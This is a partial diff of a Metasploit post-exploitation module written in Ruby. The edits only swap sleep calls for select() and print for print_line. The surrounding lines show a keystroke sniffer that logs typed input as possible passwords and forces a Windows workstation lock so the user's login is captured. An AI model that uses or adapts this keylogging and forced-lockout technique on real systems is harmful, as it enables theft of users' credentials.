@@ -117,7 +117,7 @@ class Metasploit3 < Msf::Post
 						outp << " <0x%.2x> " % vk
 					end
 				end
-				sleep(2)
+				select(nil,nil,nil,2)
 				file_local_write(logfile,"#{outp}\n")
 				if outp != nil and outp.chomp.lstrip != "" then
 					print_status("Password?: #{outp}")
@@ -138,11 +138,11 @@ class Metasploit3 < Msf::Post
 				else
 					print_status("System has currently been idle for #{currentidle} seconds and the screensaver is ON")
 				end
-				sleep(keytime.to_i)
+				select(nil,nil,nil,keytime.to_i)
 			end
 		rescue::Exception => e
 			if e.message != 'win'
-				print("\n")
+				print_line()
 				print_status("#{e.class} #{e}")
 			end
 			print_status("Stopping keystroke sniffer...")
@@ -219,7 +219,7 @@ class Metasploit3 < Msf::Post
 					print_status("Session has been locked out")
 				else
 					# sleep(keytime.to_i) / hardsleep applied due to missing loging right after lockout.. no good way to solve this
-					sleep(2)
+					select(nil,nil,nil, 2)
 				end
 			end
 		else
@@ -227,7 +227,7 @@ class Metasploit3 < Msf::Post
 			print_status("System has currently been idle for #{currentidle} seconds")
 			while currentidle <= datastore['locktime'] do
 				print_status("Current Idle time: #{currentidle} seconds")
-				sleep(datastore['heartbeat'])
+				select(nil,nil,nil,datastore['heartbeat'])
 				currentidle = session.ui.idle_time
 			end
 			client.railgun.user32.LockWorkStation()
